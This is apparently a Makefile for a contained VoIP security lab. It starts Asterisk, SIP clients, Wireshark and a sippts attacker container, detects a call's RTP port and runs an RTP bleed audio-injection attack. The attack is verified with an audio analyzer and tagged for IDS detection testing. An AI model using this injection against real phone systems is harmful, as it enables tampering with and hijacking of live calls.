STACK_ID := 4_rtp_bleed_injection_asterisk
DRY_RUN_TAG := RTC_DRY_RUN
SCENARIO ?= 4
ATTACK_TYPE := rtp_injection
EXPECTED_SIDS := 2000004
DISABLE_SHARED_LIFECYCLE_TARGETS := 1
include ../shared.mk

SERVICE ?=
NET_PREFIX ?= 10.10.$(INSTANCE_INDEX)
LAB_SUBNET ?= $(NET_PREFIX).0/24
ASTERISK_IP ?= $(NET_PREFIX).5
SIPPTS_IP ?= $(NET_PREFIX).20
BARESIP_7001_IP ?= $(NET_PREFIX).41
BARESIP_7002_IP ?= $(NET_PREFIX).42
SIP_HOST_PORT ?= $(if $(filter 0,$(INSTANCE_INDEX)),5060,1506$(INSTANCE_INDEX))
RTP_HOST_RANGE ?= $(if $(filter 0,$(INSTANCE_INDEX)),10000-10099,11$(INSTANCE_INDEX)00-11$(INSTANCE_INDEX)99)
ASTERISK_HTTP_PORT ?= $(if $(filter 0,$(INSTANCE_INDEX)),3003,30$(INSTANCE_INDEX)3)
ASTERISK_ALT_HTTP_PORT ?= $(if $(filter 0,$(INSTANCE_INDEX)),3004,30$(INSTANCE_INDEX)4)
RECORDINGS_DIR ?= $(if $(filter default,$(INSTANCE)),./recordings,./recordings/$(INSTANCE))
INJECT_REF ?= audio_inject.wav
VERIFY_NCC_THRESHOLD ?= 0.22
VERIFY_NCC_MARGIN ?= 0.12
REPEAT_RUNS ?= 20
REPEAT_DELAY_SEC ?= 2
REPEAT_LOG ?= /tmp/lab4-rtp-repeat.log
REPEAT_MIN_SUCCESS ?= $(REPEAT_RUNS)

export LAB_SUBNET ASTERISK_IP SIPPTS_IP BARESIP_7001_IP BARESIP_7002_IP SIP_HOST_PORT RTP_HOST_RANGE ASTERISK_HTTP_PORT ASTERISK_ALT_HTTP_PORT RECORDINGS_DIR

run:
	@mkdir -p "$(RECORDINGS_DIR)/baresip-cli-7001" "$(RECORDINGS_DIR)/baresip-cli-7002"
	@$(COMPOSE) up -d --remove-orphans

start: run

stop:
	@$(COMPOSE) down --remove-orphans

start-wireshark:
	# Previous implementation kept for traceability:
	# @docker exec -it wireshark wireshark
	# Change rationale: service-scoped exec targets the selected Compose project instance.
	@$(COMPOSE) exec wireshark wireshark

start-sippts:
	@$(COMPOSE) exec sippts bash

start-cli-7001:
	@$(COMPOSE) exec linphone-cli-7001 sh

start-cli-7002:
	@$(COMPOSE) exec linphone-cli-7002 sh

cli-call:
	@$(COMPOSE) exec -T linphone-cli-7001 linphone-cli-send call sip:7002@$(ASTERISK_IP)

cli-hangup:
	@$(COMPOSE) exec -T linphone-cli-7001 linphone-cli-send terminate
	@$(COMPOSE) exec -T linphone-cli-7002 linphone-cli-send terminate

cli-status:
	@$(COMPOSE) exec -T linphone-cli-7001 linphone-cli-send calls
	@$(COMPOSE) exec -T linphone-cli-7002 linphone-cli-send calls

start-baresip-7001:
	@$(COMPOSE) exec baresip-cli-7001 sh

start-baresip-7002:
	@$(COMPOSE) exec baresip-cli-7002 sh

baresip-call:
	@$(COMPOSE) exec -T baresip-cli-7001 baresip-cli-send /dial sip:7002@$(ASTERISK_IP)

baresip-hangup:
	@$(COMPOSE) exec -T baresip-cli-7001 baresip-cli-send /hangup
	@$(COMPOSE) exec -T baresip-cli-7002 baresip-cli-send /hangup

baresip-status:
	@$(COMPOSE) exec -T baresip-cli-7001 baresip-cli-send /listcalls
	@$(COMPOSE) exec -T baresip-cli-7002 baresip-cli-send /listcalls

recordings-clean:
	@mkdir -p "$(RECORDINGS_DIR)"
	@find "$(RECORDINGS_DIR)" -type f \( -name '*.wav' -o -name '*.png' -o -name '*.txt' \) -delete

recordings-list:
	@find "$(RECORDINGS_DIR)" -type f | sort

recording-proof:
	@./render-recording-proof.sh

recording-proof-file:
	@test -n "$(FILE)" || (echo "FILE=/path/to/file.wav is required" >&2; exit 1)
	@./render-recording-proof.sh "$(FILE)"

build:
	@$(COMPOSE) build --no-cache $(SERVICE)
rebuild:
	@$(COMPOSE) down --rmi all --remove-orphans || true
	@$(COMPOSE) build --no-cache $(SERVICE)

dry-run:
	@echo "$(DRY_RUN_TAG)_BEGIN stack=$(STACK_ID)"
	@$(COMPOSE) exec -T asterisk asterisk -rx "sip show settings" 2>/dev/null | grep -Eq 'Externaddr|Externhost' || { \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=asterisk_sip_settings reason=missing_external_address"; \
		exit 1; \
	}
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=asterisk_sip_settings"
	@i=0; \
	while [ $$i -lt 20 ]; do \
		PEER1="$$( $(COMPOSE) exec -T asterisk asterisk -rx 'sip show peer 7001' 2>/dev/null || true)"; \
		PEER2="$$( $(COMPOSE) exec -T asterisk asterisk -rx 'sip show peer 7002' 2>/dev/null || true)"; \
		if printf '%s\n' "$$PEER1" | grep -Eq 'Status.*OK' && printf '%s\n' "$$PEER2" | grep -Eq 'Status.*OK'; then \
			echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=baresip_peers_registered"; \
			break; \
		fi; \
		sleep 1; \
		i=$$((i+1)); \
		if [ $$i -eq 20 ]; then \
			echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=baresip_peers_registered reason=timeout"; \
			exit 1; \
		fi; \
	done
	@$(MAKE) baresip-hangup >/dev/null 2>&1 || true
	@$(MAKE) baresip-call >/dev/null
	@PORT=""; \
	i=0; \
	while [ $$i -lt 10 ]; do \
		PORT="$$(WIRESHARK_CID="$$( $(COMPOSE) ps -q wireshark )" SRC_IP=$(ASTERISK_IP) ./get-attack-cmd.sh --port-only 2>/dev/null || true)"; \
		if [ -n "$$PORT" ]; then \
			break; \
		fi; \
		sleep 1; \
		i=$$((i+1)); \
	done; \
	$(MAKE) baresip-hangup >/dev/null 2>&1 || true; \
	if [ -z "$$PORT" ]; then \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=rtp_port_detection reason=no_media_flow"; \
		exit 1; \
	fi; \
	echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=rtp_port_detection port=$$PORT"
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) ready=true"


# Build analyzer container
build-analyzer:
	cd audio-analyzer && docker build -t audio-analyzer -f Dockerfile .

# Automatic verification command
verify-injection: build-analyzer
	@LATEST_WAV=$$(ls -1t "$(RECORDINGS_DIR)"/*.wav | head -n 1); \
	if [ -z "$$LATEST_WAV" ]; then echo "No recording found"; exit 1; fi; \
	echo "[*] Analyzing: $$LATEST_WAV"; \
	docker run --rm \
		-e NCC_THRESHOLD=$(VERIFY_NCC_THRESHOLD) \
		-e NCC_MARGIN=$(VERIFY_NCC_MARGIN) \
		-v $$(pwd)/$(RECORDINGS_DIR):/recordings \
		-v $$(pwd)/$(INJECT_REF):/references/audio_inject.wav:ro \
		audio-analyzer /recordings/$$(basename "$$LATEST_WAV") /references/audio_inject.wav


# Start the full scenario, launch the attack, then verify automatically
auto-attack: stop recordings-clean build build-analyzer start
	@$(RTC_EVENT) lab_ready stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) \
		attacker_ip=$(SIPPTS_IP) victim_ip=$(ASTERISK_IP) \
		expected_sids=$(EXPECTED_SIDS) attack_type=$(ATTACK_TYPE) \
		probe_targets=$(SIPPTS_IP),$(ASTERISK_IP) probe_protocols=tcp,udp,icmp
	@echo "[*] Waiting for SIP registration (5 seconds)..."
	@sleep 5
	@$(MAKE) attack
	@$(RTC_EVENT) lab_stop stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE)

attack:
	@echo "[*] Starting Baresip call..."
	@$(MAKE) baresip-call
	@echo "[*] Detecting RTP destination port..."
	@PORT=$$(WIRESHARK_CID="$$( $(COMPOSE) ps -q wireshark )" SRC_IP=$(ASTERISK_IP) ./get-attack-cmd.sh --port-only); \
	if [ -z "$$PORT" ]; then \
		echo "[!] Failed: RTP port not found."; exit 1; \
	fi; \
	$(RTC_EVENT) attack_start stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) attack=$(ATTACK_TYPE) attacker_ip=$(SIPPTS_IP) victim_ip=$(ASTERISK_IP); \
	echo "$(ATTACK_WINDOW_TAG)_BEGIN ts_utc=$$(date -u +"%Y-%m-%dT%H:%M:%SZ") stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) attack=$(ATTACK_TYPE)"; \
	echo "[+] Intercepted port: $$PORT. Launching injection..."; \
	$(COMPOSE) exec -T sippts sippts rtpbleedinject -i $(ASTERISK_IP) -r $$PORT -f /audio_inject.wav -p 0; \
	$(RTC_EVENT) attack_end stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) attack=$(ATTACK_TYPE); \
	echo "$(ATTACK_WINDOW_TAG)_END ts_utc=$$(date -u +"%Y-%m-%dT%H:%M:%SZ") stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) attack=$(ATTACK_TYPE)"
	@echo "[*] Waiting 3 seconds to ensure audio is written to recording..."
	@sleep 3
	@echo "[*] Hanging up Baresip call..."
	@$(MAKE) baresip-hangup
	@echo "[*] Running audio analyzer verification..."
	@$(MAKE) verify-injection
	@echo "[+] Auto-attack completed and verification finished."

repeat-check:
	@echo "[*] RTP injection repetition test"
	@echo "[*] runs=$(REPEAT_RUNS) min_success=$(REPEAT_MIN_SUCCESS) delay=$(REPEAT_DELAY_SEC)s"
	@echo "[*] log=$(REPEAT_LOG)"
	@rm -f "$(REPEAT_LOG)"
	@PASS=0; FAIL=0; i=1; \
	while [ $$i -le "$(REPEAT_RUNS)" ]; do \
		echo "========== RUN $$i/$(REPEAT_RUNS) ==========" | tee -a "$(REPEAT_LOG)"; \
		if $(MAKE) auto-attack \
			ASTERISK_IP="$(ASTERISK_IP)" \
			INJECT_REF="$(INJECT_REF)" \
			VERIFY_NCC_THRESHOLD="$(VERIFY_NCC_THRESHOLD)" \
			VERIFY_NCC_MARGIN="$(VERIFY_NCC_MARGIN)" \
			>> "$(REPEAT_LOG)" 2>&1; then \
			PASS=$$((PASS+1)); \
			echo "[RUN $$i] PASS ($$PASS pass / $$FAIL fail)" | tee -a "$(REPEAT_LOG)"; \
		else \
			FAIL=$$((FAIL+1)); \
			echo "[RUN $$i] FAIL ($$PASS pass / $$FAIL fail)" | tee -a "$(REPEAT_LOG)"; \
		fi; \
		if [ $$i -lt "$(REPEAT_RUNS)" ]; then \
			sleep "$(REPEAT_DELAY_SEC)"; \
		fi; \
		i=$$((i+1)); \
	done; \
	echo "========== SUMMARY ==========" | tee -a "$(REPEAT_LOG)"; \
	echo "total=$(REPEAT_RUNS) pass=$$PASS fail=$$FAIL min_success=$(REPEAT_MIN_SUCCESS)" | tee -a "$(REPEAT_LOG)"; \
	if [ "$$PASS" -ge "$(REPEAT_MIN_SUCCESS)" ]; then \
		echo "[+] Condition satisfied."; \
		exit 0; \
	else \
		echo "[!] Condition NOT satisfied. Check $(REPEAT_LOG) for details."; \
		exit 1; \
	fi
